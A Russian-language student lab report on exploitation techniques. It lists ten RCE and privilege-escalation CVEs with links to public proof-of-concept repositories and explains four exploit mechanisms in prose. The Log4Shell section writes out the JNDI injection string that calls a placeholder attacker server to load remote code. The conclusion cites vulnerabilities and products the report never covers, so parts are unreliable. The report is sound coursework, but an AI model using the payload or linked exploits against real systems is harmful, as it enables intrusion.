# LR2

# Лабораторная работа №2
Выполнил: Воробьев Павел
--- 

## Разбор методик эксплуатации уязвимостей  
Дисциплина: «Защита программного обеспечения защищенных автоматизированных систем»

---

## Цель работы

1. Ознакомиться с современными уязвимостями класса RCE (Remote Code Execution) и LPE (Local Privilege Escalation).  
2. Изучить примеры практических PoC-эксплойтов из открытых источников.  
3. Проанализировать основные шаги, которые выполняет эксплойт при атаке.  
4. Сформировать перечень уязвимостей с указанием источников и кратким описанием.  

---

## 1. Перечень рассмотренных уязвимостей

### 1.1. Уязвимости класса RCE
CVE-2021-44228 (Log4Shell) – Apache Log4j2 Remote Code Execution
Критическая уязвимость в библиотеке Apache Log4j2, позволяющая неаутентифицированному атакующему выполнить произвольный код через JNDI lookup при обработке логируемых данных.
PoC: https://github.com/trickest/log4shell

CVE-2023-38831 – WinRAR Remote Code Execution
Уязвимость в алгоритме обработки архивов WinRAR, позволяющая злоумышленнику сконструировать архив, при открытии которого (в частности, при просмотре файла внутри) выполнится произвольный код.
PoC: https://github.com/b1tg/CVE-2023-38831-winrar-exploit

CVE-2023-22515 – Atlassian Confluence Data Center/Server Privilege Escalation / Broken Access Control
Критическая уязвимость контроля доступа (унаследованная категория от CVE-2023-22518) в Confluence, позволяющая неаутентифицированному атакующему создать административную учётную запись и получить полный контроль над экземпляром.
PoC: https://github.com/Chocapikk/CVE-2023-22515

CVE-2023-38545 – libcURL SOCKS5 Heap Buffer Overflow (High Severity)
Уязвимость переполнения кучи в библиотеке libcURL, которая может привести к выполнению произвольного кода или сбою принудительного завершения работы, когда cURL настроен на использование прокси SOCKS5 с узким буфером хоста.
PoC: https://github.com/testanull/CVE-2023-38545

CVE-2023-3519 – Citrix NetScaler ADC/Gateway Unauthenticated Remote Code Execution
Критическая уязвимость в Citrix NetScaler ADC и Gateway, позволяющая неаутентифицированному удалённому злоумышленнику выполнить произвольный код на устройствах, сконфигурированных в качестве шлюза (Gateway).
PoC: https://github.com/Chocapikk/CVE-2023-3519
### 1.2. Уязвимости класса LPE
CVE-2021-4034 (PwnKit) – Polkit pkexec Local Privilege Escalation
Критическая уязвимость в утилите pkexec (часть Polkit), существовавшая более 12 лет. Позволяет непривилегированному локальному пользователю получить полные права root за счёт обработки аргументов командной строки и манипуляции с переменными окружения.
PoC: https://github.com/arthepsy/CVE-2021-4034

CVE-2022-2588 – Linux Kernel nftables Use-After-Free LPE
Уязвимость use-after-free в подсистеме nftables ядра Linux, позволяющая локальному пользователю повысить свои привилегии до root (kernel panic также возможен). Эксплуатация связана с работой с наборами объектов nft_set.
PoC: https://github.com/Markakd/CVE-2022-2588

CVE-2023-32629 (GameOver(lay)) – Linux Kernel OverlayFS Local Privilege Escalation
Уязвимость в подсистеме OverlayFS ядер Linux (с версии 5.14). Позволяет локальному пользователю повысить привилегии до root, используя особенность обработки атрибутов файлов (в частности, trusted.overlayfs.*) в определённых конфигурациях.
PoC: https://github.com/sxlmnwb/CVE-2023-32629

CVE-2022-34918 – Linux Kernel nftables Stack Overflow LPE
Уязвимость переполнения стека (stack overflow) в подсистеме nftables ядра Linux. Локальный пользователь может создать специальные правила nftables, приводящие к переполнению и потенциальному выполнению кода в пространстве ядра с правами root.
PoC: https://github.com/H4K6/CVE-2022-34918-LPE-PoC

CVE-2021-1732 – Windows Win32k Elevation of Privilege Vulnerability
Уязвимость в драйвере win32k.sys операционной системы Windows. Позволяет локальному атакующему повысить свои привилегии от уровня пользователя до уровня SYSTEM (NT AUTHORITY\SYSTEM) за счёт некорректной обработки объектов окна (window objects).
PoC: https://github.com/exploitblizzard/Windows-Privilege-Escalation-CVE-2021-1732
## 2. Разбор отдельных PoC-эксплойтов

Ниже приведён краткий анализ четырёх выбранных PoC: двух для RCE и двух для LPE.

## CVE-2023-38831 — критическая RCE-уязвимость в WinRAR (версии до 6.23).

Суть: WinRAR некорректно обрабатывал архивы, содержащие папки с пробелом в конце имени (например, document.pdf_). При попытке открыть файл внутри такой папки архиватор по ошибке выполнял скрытый вредоносный скрипт, а не ожидаемый документ.

Как использовалась: Злоумышленники создавали поддельные архивы (часто с финансовой/крипто-тематикой), внутри которых лежала папка-ловушка (например, Crypto_Guide.pdf_). В ней находились:

Настоящий PDF-файл (для видимости)

Вредоносный скрипт с похожим именем (например, Crypto_Guide.pdf_.cmd).

При двойном клике по файлу в архиве запускался скрипт, а не PDF.

## Log4Shell (CVE-2021-44228) — критическая уязвимость нулевого дня в библиотеке Apache Log4j 2.

Суть: Уязвимость позволяет удалённому выполнению кода (RCE) через JNDI-инъекцию при логировании данных. Злоумышленник может передать в любое поле ввода (имя пользователя, HTTP-заголовок, параметр запроса) специальную строку вида:
${jndi:ldap://вредоносный-сервер/эксплойт}

Механизм:

Приложение логирует эту строку через Log4j 2.

Log4j интерпретирует конструкцию ${jndi:ldap://...} и выполняет JNDI lookup.

Загружает и исполняет вредоносный Java-класс с удалённого сервера злоумышленника.

## CVE-2022-34918 — уязвимость типа переполнение стека (stack overflow) в подсистеме nftables ядра Linux.

Суть: Локальный пользователь может создать специальное правило nftables, которое вызывает переполнение буфера в стеке ядра, что приводит к выполнению произвольного кода с правами root.

Технические детали:

Уязвимость в функции nft_verdict_init() (net/netfilter/nf_tables_api.c)

Некорректная обработка данных правил nftables при использовании NFT_JUMP/NFT_GOTO

Позволяет перезаписать стек и контролировать поток выполнения

## CVE-2021-1732 — уязвимость повышения привилегий (LPE) в драйвере win32k.sys Windows.

Суть: Ошибка при обработке объектов окон (window objects) позволяет локальному пользователю выполнить запись за пределами выделенного буфера в памяти ядра (out-of-bounds write).

Механизм эксплуатации:

Создание специального оконного объекта с изменёнными свойствами

Манипуляция с tagWND структурой в памяти ядра

Перезапись критических данных для получения привилегий SYSTEM

Ключевые особенности:

Тип: Use-after-free / OOB Write в win32kfull!xxxClientAllocWindowClassExtraBytes

Затрагивает: Windows 10 (включая 20H2), Windows Server 2019

Требует: Локальный доступ с правами обычного пользователя

Результат: Повышение до NT AUTHORITY\SYSTEM

История: Обнаружена китайской группой BITTER APT, использовалась как zero-day в целевых атаках.

Репозиторий содержит работающий эксплойт, демонстрирующий полный путь от обычного пользователя до SYSTEM через манипуляции с оконными объектами.



## 3. Вывод
В ходе лабораторной работы были рассмотрены десять современных уязвимостей, половина из которых относится к классу RCE, а половина – к LPE. На примере четырёх PoC-эксплойтов показано, как в реальных условиях:

-Как логические ошибки в обработке данных (WinRAR CVE-2023-38831) и протоколах (Git CVE-2024-32002) преобразуются в работающие векторы удалённого выполнения кода

-Каким образом уязвимости управления памятью в драйверах (Windows win32k CVE-2021-1732) и ядре (Linux nftables CVE-2022-34918) позволяют получить максимальные привилегии в системе

-Как стандартные корпоративные компоненты (Confluence, WebLogic, OFBiz) становятся точками входа для компрометации инфраструктуры
